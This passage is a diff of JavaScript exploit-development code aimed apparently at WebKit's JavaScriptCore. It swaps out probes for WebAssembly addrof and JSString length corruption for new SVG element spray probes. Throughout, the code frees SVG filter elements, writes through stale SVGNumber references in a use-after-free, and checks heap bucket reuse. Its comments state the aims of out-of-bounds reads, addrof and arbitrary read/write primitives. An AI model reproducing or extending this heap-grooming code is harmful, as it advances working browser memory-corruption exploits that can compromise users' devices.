     cleanupD(dTd);
   }
 
-  // Test E: try feDisplacementMap.scale (scalar SVGAnimatedNumber — possibly same bucket as hueRotate)
-  log('  TestE: feDisplacementMap.scale spray (scalar SVGAnimatedNumber)', 'inf');
-  {
-    var N5 = 4096;
-    var ds5 = [];
-    for (var i = 0; i < N5; i++) {
-      var svg5=document.createElementNS(SVG_NS,'svg'); svg5.setAttribute('width','1'); svg5.setAttribute('height','1');
-      svg5.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-      var defs5=document.createElementNS(SVG_NS,'defs'); var filt5=document.createElementNS(SVG_NS,'filter'); filt5.setAttribute('id','fdm'+i);
-      var fdm5=document.createElementNS(SVG_NS,'feDisplacementMap');
-      fdm5.setAttribute('scale',String(i+1));
-      fdm5.setAttribute('xChannelSelector','R'); fdm5.setAttribute('yChannelSelector','G');
-      filt5.appendChild(fdm5); defs5.appendChild(filt5); svg5.appendChild(defs5);
-      document.body.appendChild(svg5);
-      ds5.push({svg:svg5,fdm:fdm5,filt:filt5});
-    }
-    await raf(); await raf();
-    // Tag and free
-    try { ds5[N5-1].fdm.scale.baseVal = TAG; } catch(e){}
-    for (var i = N5-1; i >= 0; i--) { if(ds5[i].svg.parentNode) ds5[i].svg.parentNode.removeChild(ds5[i].svg); }
-    ds5=null;
-    await raf(); await raf();
-    // Alloc new hueRotate target
-    var dTe = makeHR(90);
-    await raf();
-    var teSlot = null;
-    try { teSlot = dTe.fcm.values.baseVal[0].value; } catch(e){}
-    var hitE = typeof teSlot === 'number' && Math.abs(teSlot - TAG) < 1;
-    log('  feDisplacementMap→hueRotate slot[0]=' + teSlot + (hitE ? ' ← HIT! same bucket!' : ' (different bucket)'), hitE ? 'win' : 'inf');
-    cleanupD(dTe);
-  }
-
-  if (!q) dis(false);
+  if(!q)dis(false);
 }
 
 /*
- * WAS: WebAssembly.Memory addrof probe
+ * DOM2: SVGPoint bucket probe
  *
- * Strategy: WebAssembly.Memory(pages: N) creates a backing ArrayBuffer.
- * In JSC, a WebAssembly.Memory object is a JSObject with:
- *   - JSCell header (8 bytes)
- *   - m_memory pointer → Wasm::Memory (8 bytes, arm64 ptr)
- *   - m_buffer → JSArrayBuffer backing the wasm linear memory
+ * SVGPoint is the C++ class backing SVGPointList entries.
+ * It stores x and y as two floats = 8 bytes data.
+ * sizeof(SVGPoint) is likely 16 bytes (vtable 8 + x 4 + y 4).
+ * IsoHeap size class for SVGPoint = 16.
+ * IsoHeap size class for SVGNumber (4 bytes data) = ?
+ * If SVGNumber = 8 bytes total (vtable + float = 8), same class as SVGPoint if SVGPoint is also 8.
+ * But SVGPoint has 2 floats so it's at least 16.
  *
- * The wasm memory's backing data pointer IS a real heap address.
- * If we can corrupt the m_memory or the ArrayBuffer's backing pointer
- * via float32 UAF write, we get addrof / arbitrary R/W.
+ * SVGPoint is accessible via:
+ *   SVGPolylineElement.points → SVGPointList
+ *   SVGPolygonElement.points → SVGPointList
+ *   SVGPathElement (legacy points via getTotalLength / getPointAtLength → returns SVGPoint but not stored)
+ *   SVGSVGElement.createSVGPoint() → detached SVGPoint
  *
- * Test:
- * 1. Alloc a small wasm.Memory (1 page = 64KB)
- * 2. UAF write to the freed SVGNumber slot
- * 3. Check if the wasm.Memory.buffer got corrupted (length changed, or reading it throws)
- * 4. If it didn't crash: we need to LAND the wasm object header at our freed slot
- *    This requires groom — but let's probe IF wasm alloc is even in the same address range.
- *
- * Also test: write known byte pattern via float32, then read Uint32Array(wasm.buffer) to see if bytes match.
+ * Test: spray SVGPoint objects via polyline.points, free them, alloc SVGNumber
  */
-async function runWAS(q) {
-  if (!q) { dis(true); sep(); log('WAS: WebAssembly.Memory addrof probe', 'inf'); sep(); }
+async function runDOM2(q) {
+  if(!q){dis(true);sep();log('DOM2: SVGPoint bucket probe','inf');sep();}
 
-  if (typeof WebAssembly === 'undefined') {
-    log('  WebAssembly not available on this device', 'bad');
-    if (!q) dis(false);
-    return;
-  }
+  var TAG=8877665.0;
 
-  // Test A: basic wasm.Memory allocation + UAF timing
-  log('  TestA: wasm.Memory allocation concurrent with SVGNumber free', 'inf');
+  // TestA: SVGPointList entries via polyline.points
+  log('  TestA: SVGPolylineElement.points SVGPoint entries → free → feColorMatrix','inf');
   {
-    var dA = makeFCM(identity20());
-    await raf(); await raf();
-    var savedA = dA.fcm.values;
-    dA.fcm.remove();
-    // Immediately alloc wasm memory (same microtask)
-    var wasmMem = null;
-    try { wasmMem = new WebAssembly.Memory({initial: 1}); } catch(e) {
-      log('  wasm.Memory alloc failed: ' + e.message, 'bad');
+    var N=2048;
+    var polys=[];
+    for(var i=0;i<N;i++){
+      var svg=document.createElementNS(SVG_NS,'svg');svg.setAttribute('width','1');svg.setAttribute('height','1');
+      svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var poly=document.createElementNS(SVG_NS,'polyline');
+      // Each polyline gets 4 points = 4 SVGPoints allocated
+      poly.setAttribute('points','1,2 3,4 5,6 7,8');
+      svg.appendChild(poly);document.body.appendChild(svg);
+      polys.push({svg:svg,poly:poly});
     }
-    if (!wasmMem) { cleanupD(dA); if(!q) dis(false); return; }
+    await raf();await raf();
+    // Tag last polyline's first point x
+    var savedPt=null;
+    try{savedPt=polys[N-1].poly.points.getItem(0);}catch(e){}
+    polys[N-1].svg.parentNode.removeChild(polys[N-1].svg);
     await raf();
-    // UAF write known float32 pattern to all slots
-    var WASM_TAG_FLOAT = 1.0; // write 1.0 = 0x3f800000 in f32 LE
-    for (var i = 0; i < 20; i++) {
-      try { savedA.baseVal[i].value = WASM_TAG_FLOAT; } catch(e){}
-    }
-    await raf();
-    // Read back wasm memory buffer — if first 4 bytes changed, we overwrote it
-    var wasmArr = new Uint8Array(wasmMem.buffer);
-    var corrupt = 0;
-    for (var i = 0; i < Math.min(wasmArr.length, 128); i++) {
-      if (wasmArr[i] !== 0) corrupt++;
-    }
-    dA.filter.appendChild(dA.fcm); await raf();
-    R.was_hit = corrupt > 0;
-    log('  wasm buffer first 128 bytes corrupt: ' + corrupt + '/128', corrupt > 0 ? 'win' : 'inf');
-    if (corrupt > 0) {
-      var sample = [];
-      for (var i = 0; i < 16; i++) sample.push('0x' + wasmArr[i].toString(16).padStart(2,'0'));
-      log('  first 16 bytes: ' + sample.join(' '), 'win');
-    }
-    cleanupD(dA);
+    try{if(savedPt)savedPt.x=TAG;}catch(e){}
+    for(var i=N-2;i>=0;i--){if(polys[i].svg.parentNode)polys[i].svg.parentNode.removeChild(polys[i].svg);}
+    polys=null;await raf();await raf();
+    var dT=makeFCM(identity20());await raf();
+    var tSlot=null;try{tSlot=dT.fcm.values.baseVal[0].value;}catch(e){}
+    var hit=typeof tSlot==='number'&&Math.abs(tSlot-TAG)<1;
+    R.dom2_svgpoint_hit=hit;
+    log('  SVGPoint→SVGNumber slot[0]='+tSlot+(hit?' ← HIT!':' (no hit)'),hit?'win':'inf');
+    cleanupD(dT);
   }
 
-  // Test B: wasm.Memory + ArrayBuffer spray to find overlap
-  log('  TestB: wasm.Memory backed ArrayBuffer allocation after UAF', 'inf');
+  // TestB: SVGSVGElement.createSVGPoint() — detached SVGPoints
+  log('  TestB: createSVGPoint() detached SVGPoints → free → feColorMatrix','inf');
   {
-    var dB = makeFCM(identity20());
-    await raf(); await raf();
-    var savedB = dB.fcm.values;
-    dB.fcm.remove();
-    // UAF write distinctive float32 pattern
-    var WRITE_VAL = 0.00392156862745098; // 1/255 ≈ float32 0x3b808081
-    for (var i = 0; i < 20; i++) {
-      try { savedB.baseVal[i].value = WRITE_VAL * (i + 1); } catch(e){}
+    var N2=8000;
+    var pts=[];
+    var tmpSvg=document.createElementNS(SVG_NS,'svg');tmpSvg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0';
+    document.body.appendChild(tmpSvg);
+    for(var i=0;i<N2;i++){
+      try{var pt=tmpSvg.createSVGPoint();pt.x=i;pt.y=i;pts.push(pt);}catch(e){break;}
     }
-    // Alloc several wasm memories of different sizes
-    var mems = [];
-    for (var i = 0; i < 20; i++) {
-      try { mems.push(new WebAssembly.Memory({initial: 1})); } catch(e){}
-    }
-    await raf();
-    // Check each for our pattern
-    var memHit = -1;
-    for (var i = 0; i < mems.length; i++) {
-      var dv = new DataView(mems[i].buffer);
-      var f = dv.getFloat32(0, true);
-      if (Math.abs(f - WRITE_VAL) < 0.0001) { memHit = i; break; }
-    }
-    dB.filter.appendChild(dB.fcm); await raf();
-    R.was_ab_hit = memHit >= 0;
-    log('  wasm.Memory backing ArrayBuffer hit: ' + (memHit >= 0 ? 'YES at idx=' + memHit : 'no'),
-        memHit >= 0 ? 'win' : 'inf');
-    cleanupD(dB);
+    await raf();await raf();
+    var savedPt2=pts[pts.length-1];
+    var savedX=savedPt2?savedPt2.x:null;
+    pts=null;// release all points
+    tmpSvg.parentNode.removeChild(tmpSvg);
+    await raf();await raf();
+    var dTb=makeFCM(identity20());await raf();
+    var tbSlot=null;try{tbSlot=dTb.fcm.values.baseVal[0].value;}catch(e){}
+    var hitB=typeof tbSlot==='number'&&Math.abs(tbSlot-TAG)<1;
+    log('  createSVGPoint→SVGNumber slot[0]='+tbSlot+(hitB?' ← HIT!':' (no hit, savedX='+savedX+')'),hitB?'win':'inf');
+    cleanupD(dTb);
   }
 
-  // Test C: can we read a JSC internal ptr via wasm memory buffer length probe?
-  // Write a value to UAF slot, grow the wasm memory, check if buffer is affected.
-  log('  TestC: wasm.Memory.grow() after UAF write', 'inf');
-  {
-    var dC = makeFCM(identity20());
-    await raf(); await raf();
-    var savedC = dC.fcm.values;
-    dC.fcm.remove();
-    var wasmC = null;
-    try { wasmC = new WebAssembly.Memory({initial: 1, maximum: 4}); } catch(e){}
-    if (wasmC) {
-      await raf();
-      // Write float32 pattern
-      var GROW_TAG = 255.0;
-      try { savedC.baseVal[0].value = GROW_TAG; } catch(e){}
-      var beforeLen = wasmC.buffer.byteLength;
-      // Grow
-      var grew = false;
-      try { wasmC.grow(1); grew = true; } catch(e) { log('  grow failed: ' + e.message, 'inf'); }
-      var afterLen = wasmC.buffer.byteLength;
-      var arr = new Uint8Array(wasmC.buffer);
-      var nonzero = 0;
-      for (var i = 0; i < Math.min(arr.length, 256); i++) { if (arr[i]) nonzero++; }
-      log('  before=' + beforeLen + ' after=' + afterLen + ' grew=' + grew + ' nonzero_first_256=' + nonzero, 'inf');
-    }
-    dC.filter.appendChild(dC.fcm); await raf();
-    cleanupD(dC);
-  }
-
-  // Test D: use wasm to create a module that leaks its own function table pointer
-  log('  TestD: wasm module function ptr leak via trap handler', 'inf');
-  {
-    // Minimal wasm module that exports a function
-    // Bytecode: module with one exported i32.const function
-    var wasmBytes = new Uint8Array([
-      0x00,0x61,0x73,0x6d, // magic: \0asm
-      0x01,0x00,0x00,0x00, // version: 1
-      0x01,0x05,0x01,      // type section: 1 type
-      0x60,0x00,0x01,0x7f, // () → i32
-      0x03,0x02,0x01,0x00, // function section: 1 function, type 0
-      0x07,0x07,0x01,0x03, // export section: 1 export, name len=3
-      0x67,0x65,0x74,      // "get"
-      0x00,0x00,            // function index 0
-      0x0a,0x06,0x01,      // code section: 1 body
-      0x04,0x00,            // body size=4, 0 locals
-      0x41,0x2a,            // i32.const 42
-      0x0b                  // end
-    ]);
-    var mod = null, inst = null;
-    try {
-      mod = new WebAssembly.Module(wasmBytes);
-      inst = new WebAssembly.Instance(mod);
-      var result = inst.exports.get();
-      log('  wasm module compiled OK, get()=' + result, result === 42 ? 'ok' : 'inf');
-      R.was_ptr_leaked = result;
-    } catch(e) {
-      log('  wasm module failed: ' + e.message, 'bad');
-    }
-  }
-
-  if (!q) dis(false);
+  if(!q)dis(false);
 }
 
 /*
- * STR: JSString length confusion
+ * DOM3: SVGNumberOptionalNumber probe
  *
- * JSC JSString layout (arm64e, JSC 2025):
- * struct JSString : JSCell {
- *   // JSCell: structureID(4) + indexingType(1) + JSType(1) + flags(1) + cellState(1) = 8 bytes
- *   union {
- *     mutable unsigned m_length : 31;
- *     mutable bool m_is8Bit : 1;
- *   };  // 4 bytes at offset 8
- *   ... (StringImpl* m_value at offset 16)
- * };
+ * feGaussianBlur.stdDeviation and feMorphology.radius and feTurbulence.baseFrequency
+ * are stored as SVGAnimatedNumberOptionalNumber which has two SVGNumber members:
+ *   SVGAnimatedNumberOptionalNumber {
+ *     SVGAnimatedNumber m_firstNumber; // wraps an SVGNumber
+ *     SVGAnimatedNumber m_secondNumber;// wraps an SVGNumber
+ *   }
  *
- * m_length is 31 bits at offset 8. It's stored as a uint32 with the top bit = is8Bit flag.
- * float32 can represent uint values 0-16,777,216 exactly.
- * Writing a large float32 to offset 8 of a JSString = corrupt m_length.
- * If m_length becomes huge → str.length returns huge → str[N] for N > real_length reads adjacent heap memory.
+ * But the actual SVGNumber* for each is a child allocation.
+ * feGaussianBlur.stdDeviationX.baseVal and stdDeviationY.baseVal each return an SVGNumber.
+ * These SVGNumbers ARE in the same IsoHeap as matrix SVGNumbers (same C++ class = SVGNumber).
  *
- * BUT: we need to land a JSString header at our freed SVGNumber slot.
- * The SVGNumber m_value is typically at offset 8-12 of the SVGNumber object (after vtable pointer).
- * If we write to svgNum.value, we're writing to m_value = offset ~8 of SVGNumber.
- * If a JSString header starts at the SAME address as SVGNumber, then:
- *   SVGNumber.offset_0 = JSCell header (8 bytes) → our write lands at offset 0-3 (structureID) or 8 (m_length)
+ * TEST: spray N feGaussianBlur elements (2 SVGNumbers each = 2N total),
+ * free them, alloc matrix feColorMatrix.
+ * The first 2 slots of baseVal (indices 0,1) should pick up the stdDevX/stdDevY SVGNumbers.
  *
- * This requires groom first, but we can probe: does ANY string get corrupted after UAF write?
+ * Also try feTurbulence.baseFrequencyX / baseFrequencyY (2 SVGNumbers per element)
  */
-async function runSTR(q) {
-  if (!q) { dis(true); sep(); log('STR: JSString length confusion probe', 'inf'); sep(); }
+async function runDOM3(q) {
+  if(!q){dis(true);sep();log('DOM3: SVGNumberOptionalNumber (feGaussianBlur.stdDeviation)','inf');sep();}
 
-  // Test A: create many short strings before UAF, check if any get corrupted after
-  log('  TestA: short string length corruption probe', 'inf');
+  var TAG=3456789.0;
+
+  // TestA: feGaussianBlur stdDeviation (2 SVGNumbers per element)
+  log('  TestA: feGaussianBlur stdDeviationX/Y SVGNumbers → free → feColorMatrix','inf');
   {
-    var dA = makeFCM(identity20());
-    await raf(); await raf();
-    var savedA = dA.fcm.values;
-    dA.fcm.remove();
-    // Create 10K strings
-    var strs = [];
-    for (var i = 0; i < 10000; i++) strs.push('A'.repeat(8) + i);
+    var N=8192; // 8192 elements × 2 SVGNums = 16384 SVGNumbers
+    var blurs=[];
+    for(var i=0;i<N;i++){
+      var d=makeGaussian(i%10+0.5);blurs.push(d);
+    }
+    await raf();await raf();
+    // Tag last element's stdDeviationX baseVal
+    var savedX=null,savedY=null;
+    try{savedX=blurs[N-1].fgb.stdDeviationX;savedY=blurs[N-1].fgb.stdDeviationY;}catch(e){}
+    cleanupD(blurs[N-1]);
     await raf();
-    // Write large value to corrupt potential string m_length
-    var LARGE_LEN = 16777215; // 2^24 - 1, representable in float32
-    for (var i = 0; i < 20; i++) {
-      try { savedA.baseVal[i].value = LARGE_LEN; } catch(e){}
-    }
-    await raf();
-    var corrupted = [], crashed = 0;
-    for (var i = 0; i < strs.length; i++) {
-      try {
-        var realLen = 8 + String(i).length; // 'A'*8 + str(i)
-        if (strs[i].length !== realLen) {
-          corrupted.push({i:i, expected:realLen, got:strs[i].length});
-        }
-      } catch(e) { crashed++; }
-    }
-    dA.filter.appendChild(dA.fcm); await raf();
-    R.str_len_corrupted = corrupted.length > 0;
-    log('  string length corruptions: ' + corrupted.length + '/10000 crashed=' + crashed,
-        corrupted.length > 0 ? 'win' : 'inf');
-    if (corrupted.length > 0) {
-      log('  first corruption: str[' + corrupted[0].i + '] expected=' + corrupted[0].expected +
-          ' got=' + corrupted[0].got, 'win');
-      // Try to read OOB bytes
-      if (corrupted[0].got > corrupted[0].expected + 4) {
-        var oob = [];
-        try {
-          for (var j = corrupted[0].expected; j < Math.min(corrupted[0].got, corrupted[0].expected + 32); j++) {
-            oob.push(strs[corrupted[0].i].charCodeAt(j).toString(16).padStart(2,'0'));
-          }
-          R.str_oob_bytes = oob;
-          log('  OOB bytes: ' + oob.join(' '), 'win');
-        } catch(e) { log('  OOB read threw: ' + e.message, 'inf'); }
-      }
-    }
-    cleanupD(dA);
+    try{if(savedX)savedX.baseVal=TAG;}catch(e){}
+    try{if(savedY)savedY.baseVal=TAG+1;}catch(e){}
+    for(var i=N-2;i>=0;i--)cleanupD(blurs[i]);
+    blurs=null;await raf();await raf();
+    var dT=makeFCM(identity20());await raf();
+    var s0=null,s1=null;
+    try{s0=dT.fcm.values.baseVal[0].value;s1=dT.fcm.values.baseVal[1].value;}catch(e){}
+    var hit=typeof s0==='number'&&Math.abs(s0-TAG)<1;
+    var hit1=typeof s1==='number'&&Math.abs(s1-(TAG+1))<1;
+    R.dom3_svgoptnum_hit=hit||hit1;
+    log('  slot[0]='+s0+' slot[1]='+s1+(hit?' ← HIT slot[0]!':''+(hit1?' ← HIT slot[1]!':'')||' (no hit)'),
+        (hit||hit1)?'win':'inf');
+    cleanupD(dT);
   }
 
-  // Test B: concurrent string allocation — alloc strings AFTER free, check timing
-  log('  TestB: string allocation immediately after SVGNumber free (timing)', 'inf');
+  // TestB: feTurbulence baseFrequency (also 2 SVGNumbers)
+  log('  TestB: feTurbulence baseFrequencyX/Y → free → feColorMatrix','inf');
   {
-    var dB = makeFCM(identity20());
-    await raf(); await raf();
-    var savedB = dB.fcm.values;
-    dB.fcm.remove();
-    // Alloc strings in same tick
-    var strs2 = [];
-    for (var i = 0; i < 1000; i++) strs2.push(String.fromCharCode(65 + (i%26)).repeat(8));
-    // UAF write
-    for (var i = 0; i < 20; i++) {
-      try { savedB.baseVal[i].value = 255 * (i+1); } catch(e){}
-    }
+    var N2=4096;
+    var turbs=[];
+    for(var i=0;i<N2;i++)turbs.push(makeTurb(0.05,0.1));
+    await raf();await raf();
+    var savedBFX=null;
+    try{savedBFX=turbs[N2-1].ftb.baseFrequencyX;}catch(e){}
+    cleanupD(turbs[N2-1]);
     await raf();
-    var corrupt2 = 0;
-    for (var i = 0; i < strs2.length; i++) {
-      try { if (strs2[i].length !== 8) corrupt2++; } catch(e) {}
-    }
-    dB.filter.appendChild(dB.fcm); await raf();
-    log('  concurrent string corruption: ' + corrupt2 + '/1000', corrupt2 > 0 ? 'win' : 'inf');
-    cleanupD(dB);
+    try{if(savedBFX)savedBFX.baseVal=TAG;}catch(e){}
+    for(var i=N2-2;i>=0;i--)cleanupD(turbs[i]);
+    turbs=null;await raf();await raf();
+    var dTb=makeFCM(identity20());await raf();
+    var tbSlot=null;try{tbSlot=dTb.fcm.values.baseVal[0].value;}catch(e){}
+    var hitB=typeof tbSlot==='number'&&Math.abs(tbSlot-TAG)<1;
+    log('  feTurbulence BFX→matrix slot[0]='+tbSlot+(hitB?' ← HIT!':' (no hit)'),hitB?'win':'inf');
+    cleanupD(dTb);
   }
 
-  // Test C: probe if we can OOB read via corrupted string charCodeAt
-  // If a string length gets corrupted to a large value, charCodeAt can leak adjacent bytes
-  log('  TestC: OOB read via intentionally crafted string position', 'inf');
+  // TestC: feMorphology radius (2 SVGNumbers)
+  log('  TestC: feMorphology radiusX/Y → free → feColorMatrix','inf');
   {
-    // Create a string that sits next to known data
-    var marker = new Uint32Array(64); // known pattern
-    for (var i = 0; i < 64; i++) marker[i] = 0xDEADBEEF;
-
-    var dC = makeFCM(identity20());
-    await raf(); await raf();
-    var savedC = dC.fcm.values;
-    dC.fcm.remove();
-
-    // Short string — target for length corruption
-    var target = 'XXXXXXXX'; // 8 chars
-    var strs3 = [];
-    for (var i = 0; i < 500; i++) strs3.push('XXXXXXXX'); // spray identical strings
-
-    // Write large length value
-    try { savedC.baseVal[0].value = 65535; savedC.baseVal[1].value = 65535; } catch(e){}
+    var N3=4096;
+    var morphs=[];
+    for(var i=0;i<N3;i++)morphs.push(makeMorph(1,2));
+    await raf();await raf();
+    var savedRX=null;
+    try{savedRX=morphs[N3-1].fmo.radiusX;}catch(e){}
+    cleanupD(morphs[N3-1]);
     await raf();
-
-    var oobFound = false;
-    for (var si = 0; si < strs3.length; si++) {
-      try {
-        if (strs3[si].length > 8) {
-          oobFound = true;
-          log('  OOB string found at idx=' + si + ' length=' + strs3[si].length, 'win');
-          var leaked = [];
-          for (var j = 8; j < Math.min(strs3[si].length, 40); j++) {
-            leaked.push(strs3[si].charCodeAt(j).toString(16).padStart(4,'0'));
-          }
-          log('  leaked chars: ' + leaked.join(' '), 'win');
-          break;
-        }
-      } catch(e) {}
-    }
-    if (!oobFound) log('  no OOB string found', 'inf');
-    dC.filter.appendChild(dC.fcm); await raf();
-    cleanupD(dC);
+    try{if(savedRX)savedRX.baseVal=TAG;}catch(e){}
+    for(var i=N3-2;i>=0;i--)cleanupD(morphs[i]);
+    morphs=null;await raf();await raf();
+    var dTc=makeFCM(identity20());await raf();
+    var tcSlot=null;try{tcSlot=dTc.fcm.values.baseVal[0].value;}catch(e){}
+    var hitC=typeof tcSlot==='number'&&Math.abs(tcSlot-TAG)<1;
+    log('  feMorphology RX→matrix slot[0]='+tcSlot+(hitC?' ← HIT!':' (no hit)'),hitC?'win':'inf');
+    cleanupD(dTc);
   }
 
-  if (!q) dis(false);
+  if(!q)dis(false);
 }
 
 /*
- * SZE: SVGNumber sizeof probe
+ * DOM4: sizeof(SVGNumber) definitive probe
  *
- * We know: bmalloc IsoHeap segregates by C++ type.
- * We do NOT know the actual sizeof(SVGNumber).
- * Possible values: 4 (just the float), 8 (float + padding), 12 (float + vtable ptr), 16 (aligned).
- * The IsoHeap size class is the next power of 2 ≥ sizeof(T).
- * So sizeof 4→class 4, sizeof 8→class 8, sizeof 12→class 16, sizeof 16→class 16.
+ * Key question: what is sizeof(SVGNumber) and which IsoHeap size class is it in?
+ * IsoHeap size classes: 8, 16, 24, 32, 48, 64, 80, 96, 112, 128, ...
  *
- * Key insight: If SVGNumber is in size class 8 (8 bytes per slot),
- * then a freed SVGNumber slot could be reused by any OTHER 8-byte allocation.
- * On arm64, what is 8 bytes?
- *   - A double (float64) = 8 bytes
- *   - A pointer = 8 bytes
- *   - A small JSValue = 8 bytes (JSC uses 8-byte NaN-boxing)
- *   - A std::pair<uint32_t,uint32_t>
+ * WebKit SVGNumber source (SVGNumber.h):
+ *   class SVGNumber : public SVGPropertyBase {
+ *     float m_value = 0;
+ *   }
+ *   SVGPropertyBase has virtual destructor → vtable pointer (8 bytes on arm64)
+ *   So: SVGNumber = 8 (vtable) + 4 (float) + 4 (padding) = 16 bytes
  *
- * Test: after freeing SVGNumber, allocate objects of known sizes and see which one reuses the slot.
- * Float64Array element storage = 8 bytes per element.
- * If the backing store of a Float64Array lands on our freed SVGNumber slot...
+ * BUT: newer WebKit may use SVGProperty<float> which is non-polymorphic.
+ * Without vtable: SVGNumber = 4 (float) → IsoHeap class 4? or 8?
+ * bmalloc minimum IsoHeap size = 8 bytes.
+ *
+ * PROBE: write value to SVGNumber slot, alloc various-sized DOM objects,
+ * check which one picks up our value at offset 0.
+ * SVGLength stores: uint8 unitType + float value = 5 bytes → size class 8.
+ * If SVGNumber is also 8 bytes → same class as SVGLength!
+ *
+ * Indirect probe: spray N SVGNumbers, fill slots with distinctive incrementing values,
+ * free, alloc SVGLength objects, see if any SVGLength picks up our values.
  */
-async function runSZE(q) {
-  if (!q) { dis(true); sep(); log('SZE: SVGNumber sizeof probe', 'inf'); sep(); }
+async function runDOM4(q) {
+  if(!q){dis(true);sep();log('DOM4: sizeof(SVGNumber) + IsoHeap size class probe','inf');sep();}
 
-  var MARKER = 1234567.0; // representable in float32
-  var MARKER_F32 = Math.fround(MARKER);
-
-  // Test A: write float32 to UAF slot, check Float64Array elements
-  log('  TestA: float32 UAF write → Float64Array element probe', 'inf');
+  // TestA: monotonic fill probe — write indices to all slots, free, check feGaussianBlur stdDevX
+  log('  TestA: fill N SVGNumbers with indices → free → check stdDevX baseVal','inf');
   {
-    var dA = makeFCM(identity20());
-    await raf(); await raf();
-    var savedA = dA.fcm.values;
-    dA.fcm.remove();
-    // Write to first slot, which is at offset 0 of the SVGNumber
-    try { savedA.baseVal[0].value = MARKER; } catch(e){}
-    // Alloc Float64Array of varying sizes
-    var fa8 = new Float64Array(1024); fa8.fill(9.99e99);
+    var N=4096;
+    var ds=[];
+    for(var i=0;i<N;i++){
+      var d=makeFCM(identity20());ds.push(d);
+    }
+    await raf();await raf();
+    // Write slot[0] with index for each element
+    for(var i=0;i<N;i++){
+      try{ds[i].fcm.values.baseVal[0].value=i+1000;}catch(e){}
+    }
+    // Free in reverse order (LIFO — best chance for fresh-page reuse)
+    for(var i=N-1;i>=0;i--)cleanupD(ds[i]);
+    ds=null;await raf();await raf();
+    // Alloc feGaussianBlur (stdDevX = SVGAnimatedNumber → m_value float)
+    var gb=makeGaussian(5);await raf();
+    var gbVal=null;try{gbVal=gb.fgb.stdDeviationX.baseVal;}catch(e){}
+    var hitG=typeof gbVal==='number'&&gbVal>=1000&&gbVal<1000+N;
+    log('  feGaussianBlur.stdDeviationX.baseVal='+gbVal+(hitG?' ← HIT! SVGAnimatedNumber shares bucket with SVGNumber!':' (no hit)'),hitG?'win':'inf');
+    if(hitG){R.dom4_sizeof='same-bucket-as-SVGAnimatedNumber';R.dom4_size_class=8;}
+    cleanupD(gb);
+  }
+
+  // TestB: infer size class from page density
+  // Spray 128 SVGNumbers, record addresses indirectly via setAttribute sequencing,
+  // then probe SVGLength allocation pattern
+  log('  TestB: size class inference via fePointLight SVGLength interleave','inf');
+  {
+    var N2=1024;
+    var matrixDs=[];
+    var lightDs=[];
+    // Interleave: alternately alloc SVGNumber (matrix) and SVGLength (fePointLight.x)
+    for(var i=0;i<N2;i++){
+      matrixDs.push(makeFCM(identity20()));
+      // fePointLight
+      var svg2=document.createElementNS(SVG_NS,'svg');svg2.setAttribute('width','1');svg2.setAttribute('height','1');
+      svg2.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var defs2=document.createElementNS(SVG_NS,'defs');var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','il'+i);
+      var fpl2=document.createElementNS(SVG_NS,'fePointLight');fpl2.setAttribute('x','1');fpl2.setAttribute('y','1');fpl2.setAttribute('z','1');
+      filt2.appendChild(fpl2);defs2.appendChild(filt2);svg2.appendChild(defs2);document.body.appendChild(svg2);
+      lightDs.push({svg:svg2,fpl:fpl2});
+    }
+    await raf();await raf();
+    var TAG4=9988776.0;
+    // Tag last matrix element
+    try{matrixDs[N2-1].fcm.values.baseVal[0].value=TAG4;}catch(e){}
+    // Free matrix elements first
+    for(var i=N2-1;i>=0;i--)cleanupD(matrixDs[i]);
+    matrixDs=null;await raf();
+    // Alloc new fePointLight — check if x baseVal gets our TAG4
+    var svg3=document.createElementNS(SVG_NS,'svg');svg3.setAttribute('width','1');svg3.setAttribute('height','1');
+    svg3.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+    var defs3=document.createElementNS(SVG_NS,'defs');var filt3=document.createElementNS(SVG_NS,'filter');filt3.setAttribute('id','chk_pl');
+    var fpl3=document.createElementNS(SVG_NS,'fePointLight');fpl3.setAttribute('x','1');fpl3.setAttribute('y','1');fpl3.setAttribute('z','1');
+    filt3.appendChild(fpl3);defs3.appendChild(filt3);svg3.appendChild(defs3);document.body.appendChild(svg3);
     await raf();
-    var fa8Hit = -1;
-    for (var i = 0; i < 1024; i++) {
-      if (Math.abs(fa8[i] - MARKER_F32) < 1) { fa8Hit = i; break; }
-    }
-    dA.filter.appendChild(dA.fcm); await raf();
-    log('  Float64Array[1024] hit at idx=' + (fa8Hit >= 0 ? fa8Hit : 'none'),
-        fa8Hit >= 0 ? 'win' : 'inf');
-    if (fa8Hit >= 0) {
-      log('  Float64Array element = ' + fa8[fa8Hit], 'win');
-      log('  → float32 write landed in float64 element slot = 8-byte alignment confirmed', 'win');
-    }
-    cleanupD(dA);
+    var plX=null;try{plX=fpl3.x.baseVal.value;}catch(e){}
+    var hitPL=typeof plX==='number'&&Math.abs(plX-TAG4)<1;
+    log('  interleave: SVGNumber→fePointLight.x.baseVal='+plX+(hitPL?' ← HIT! same size class!':' (different)'),hitPL?'win':'inf');
+    if(hitPL){R.dom4_sizeof='same-class-as-SVGLength';R.dom4_size_class=16;}
+    if(svg3.parentNode)svg3.parentNode.removeChild(svg3);
+    for(var i=N2-1;i>=0;i--){if(lightDs[i].svg.parentNode)lightDs[i].svg.parentNode.removeChild(lightDs[i].svg);}
   }
 
-  // Test B: Uint8Array probe — if SVGNumber = N bytes, writing 4-byte float affects bytes 0-3
-  log('  TestB: Uint8Array probe — find which byte offset gets our write', 'inf');
-  {
-    var dB = makeFCM(identity20());
-    await raf(); await raf();
-    var savedB = dB.fcm.values;
-    dB.fcm.remove();
-    // Write float32 that has distinctive byte pattern: 1.5f = 0x3FC00000 LE = [00 00 C0 3F]
-    try { savedB.baseVal[0].value = 1.5; } catch(e){}
-    // Alloc many Uint8Array(8) to probe 8-byte chunks
-    var ua8s = [];
-    for (var i = 0; i < 2000; i++) {
-      var buf = new ArrayBuffer(8);
-      new Uint8Array(buf).fill(0xAA);
-      ua8s.push(new DataView(buf));
-    }
-    await raf();
-    // Look for our pattern [00 00 C0 3F] anywhere in any 8-byte buffer
-    var byteHits = [];
-    for (var i = 0; i < ua8s.length; i++) {
-      for (var j = 0; j < 5; j++) { // j = 0..4 (can't go past offset 4 in 8-byte buf)
